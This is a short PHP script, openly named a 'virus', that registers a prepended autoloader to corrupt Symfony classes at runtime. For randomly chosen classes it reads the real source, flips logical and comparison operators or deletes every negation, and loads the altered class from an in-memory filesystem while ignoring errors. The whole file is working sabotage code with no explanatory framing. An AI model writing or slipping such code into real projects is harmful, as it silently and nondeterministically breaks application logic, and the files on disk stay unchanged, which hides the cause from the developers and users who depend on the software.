<?php

use Vfs\FileSystem;
use Vfs\Node\File;

if (!file_exists('../vendor/composer/autoload_psr4.php')) {
    return;
}

$fs = FileSystem::factory('virus://');
$fs->mount();

$map = require '../vendor/composer/autoload_psr4.php';

$virus = function ($class) use ($fs, $map) {
    foreach ($map as $prefix => $basePaths) {
        if (strpos($class, 'Symfony') !== 0) {
            return null;
        }

        if (random_int(0, 1) !== 0) {
            return null;
        }

        if (strpos($class, $prefix) !== 0) {
            continue;
        }

        foreach ($basePaths as $basePath) {
            $path = $basePath.DIRECTORY_SEPARATOR.substr(str_replace('\\', DIRECTORY_SEPARATOR, $class), strlen($prefix)).'.php';

            if (file_exists($path)) {
                $content = file_get_contents($path);

                switch (random_int(0, 6)) {
                    case 0:
                        $content = str_replace('||', '&&', $content);

                        break;

                    case 1:
                        $content = str_replace('&&', '||', $content);

                        break;

                    case 2:
                        $content = str_replace('++', '--', $content);

                        break;

                    case 3:
                        $content = str_replace('--', '++', $content);

                        break;

                    case 4:
                        $content = str_replace('===', '!==', $content);

                        break;

                    case 5:
                        $content = str_replace('!==', '===', $content);

                        break;

                    case 6:
                        $content = str_replace('!', '', $content);

                        break;
                }

                $filename = sprintf('fucked_up_class.%s.php', md5($class));
                $fs->get('/')->add($filename, new File($content));

                try {
                    return require_once sprintf('virus://%s', $filename);
                } catch (Error $e) {
                }
            }
        }
    }
};

spl_autoload_register($virus, false, true);
